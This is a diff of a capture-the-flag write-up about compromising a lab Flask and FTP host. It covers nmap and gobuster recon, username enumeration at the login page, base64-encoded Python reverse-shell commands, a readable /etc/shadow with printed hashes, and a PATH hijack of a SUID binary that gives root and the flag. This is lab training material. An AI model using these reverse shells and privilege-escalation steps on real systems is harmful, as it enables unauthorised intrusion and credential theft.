@@ -14,11 +14,22 @@ flask_1  |       |          ^~~~~~~~~
 
 ## Initial Recon
 
-Nmap
+Nmap gives us two services that should be interesting
  
-  - FTP 
-  - HTTP (5000)
+```
+sudo nmap -sV 127.0.0.1 --top-ports=100
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 10:42 BST
+Nmap scan report for gogs.comsec (127.0.0.1)
+Host is up (0.0000070s latency).
+Not shown: 98 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
+Service Info: Host: Welcome
+```
+ 
 
+## Go Buster
 
 ```
 $ docker run --rm -v "/home/dang/Wordlists:/wordlists" devalias/gobuster -w /wordlists/common.txt -u http://192.168.1.4:5000 -x html -s 200,403
@@ -39,8 +50,10 @@ Gobuster v1.3                OJ Reeves (@TheColonial)
 =====================================================
 ```
 
+ - Console is the Debug Console for flask...
 
-Web page
+
+## Web page
 
 Create some creds
 
@@ -50,7 +63,7 @@ Create some creds
  
 Tells me to go to the notes page...
 
-## So with the login
+### Things learnt from Login Page
 
  - Unknown user we get "user does not exist"
  - Known user we get "invalid password"
@@ -196,9 +209,8 @@ echo "cHl0aG9uIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy
 
 So that's a bit of a fucker,  why isnt that working...  Python version and damn Debian...
 
-As python is blocked..  
 
-Whic python (d2hpY2ggcHl0aG9u) gives me nothing
+Which python (d2hpY2ggcHl0aG9u) gives me nothing
 
 Python3 does exist
 
@@ -210,6 +222,15 @@ echo "cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3
 
 And it hangs which is a great sign...
 
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+intern@511a9e933b20:/$ id
+id
+uid=3232(intern) gid=999(intern) groups=999(intern)
+```
+
+
+
 
 ## Manager....
 
@@ -218,7 +239,7 @@ intern@4829678f439b:/home/manager$ chmod +x /tmp/cat
 chmod +x /tmp/cat
 
 However I dont have the correct permissions to SUID that.
-A bit fo recon later...  /etc/shdow it readable
+A bit of recon later...  /etc/shdow it readable
 
 ```
 ['', '6', 'oFWC0rkHygWWmjgZ', 'enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/']
@@ -236,75 +257,48 @@ id
 uid=222(manager) gid=222(manager) groups=222(manager),1000(rootish)
 ```
 
-Ok so now we have 
-
-```
-manager@4829678f439b:~$ ls -l /usr/bin/cp
-ls -l /usr/bin/cp
--rwsr-xr-x 1 manager root 153976 Sep  5  2019 /usr/bin/cp
-```
-
-
-Which still isnt much use.  However id gives us rootish group
-
-```
-manager@4829678f439b:~$ find / -group rootish 2>/dev/null
-find / -group rootish 2>/dev/null
-/etc/shadow
-```
-
-```
-ls -l /etc/shadow
--rw-r--r-- 1 root rootish 859 Apr  3 20:54 /etc/shadow
-```
-
-While i cant write directly,  perhaps I can copy 
-
-```
-root:$6$Mho/yWVF4uag7ASh$Zpc.ryZVLWxiL81V.ykROK2RgtoWq3v58NqhCLHXAC1Pq7E8.i9dFU6/uO.9ySG/zjceCxhTzhIpb43BRVJBm.:18720:0:99999:7:::
-daemon:*:18718:0:99999:7:::
-bin:*:18718:0:99999:7:::
-sys:*:18718:0:99999:7:::
-sync:*:18718:0:99999:7:::
-games:*:18718:0:99999:7:::
-man:*:18718:0:99999:7:::
-lp:*:18718:0:99999:7:::
-mail:*:18718:0:99999:7:::
-news:*:18718:0:99999:7:::
-uucp:*:18718:0:99999:7:::
-proxy:*:18718:0:99999:7:::
-www-data:*:18718:0:99999:7:::
-backup:*:18718:0:99999:7:::
-list:*:18718:0:99999:7:::
-irc:*:18718:0:99999:7:::
-gnats:*:18718:0:99999:7:::
-nobody:*:18718:0:99999:7:::
-_apt:*:18718:0:99999:7:::
-intern:$6$7bGJuDAJYbtjddHs$orq2RKCGNDPvIzwCkcE3aEX7TA7LDrS2ToYYcAm7Bc4UP0VhrptKLptRhwPsojkOxqF8DV3BWmPN39or8n0Ox0:18720::::::
-manager:$6$oFWC0rkHygWWmjgZ$enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/:18720::::::
-```
-
-Replace root with manager and 
-
-```
-cat '<big string' > newShadow
-```
-
-Nope
-
-
 ## Turns out we didnt have correct perms on the SUID
 
-Modify runme.sh
-
 ```
-chown root:manager /home/manager/runme
+manager@511a9e933b20:~$ ls -la
+ls -la
+total 56
+drwxr-xr-x 1 manager manager  4096 Apr  4 18:47 .
+drwxr-xr-x 1 root    root     4096 Apr  4 17:40 ..
+-rw-r--r-- 1 manager manager   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 manager manager  3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 manager manager   807 Feb 25  2020 .profile
+-rw-r--r-- 1 root    root     3151 Apr  3 20:50 research.txt
+-rwsr-sr-x 1 root    manager 16784 Apr  4 18:47 runme
+-rw-r--r-- 1 root    root      157 Apr  4 18:14 source.c
+-r-------- 1 root    root       36 Apr  3 20:50 user.txt
 ```
 
 And now we should be good to go..
 
 
+```
+manager@511a9e933b20:~$ echo "/bin/sh" > /tmp/cat
+echo "/bin/sh" > /tmp/cat
+manager@511a9e933b20:~$ chmod +x /tmp/cat
+chmod +x /tmp/cat
+manager@511a9e933b20:~$ PATH=/tmp:$PATH ./runme
+PATH=/tmp:$PATH ./runme
+# id
+id
+uid=0(root) gid=222(manager) groups=222(manager),1000(rootish)
+# 
+```
 
+
+Remembering cat is now sh
+
+```
+# /bin/cat /root/root.txt
+/bin/cat /root/root.txt
+cuehack{amstelvirus_is_not_actually_real}
+# 
+```
 
 ## Other Things
 
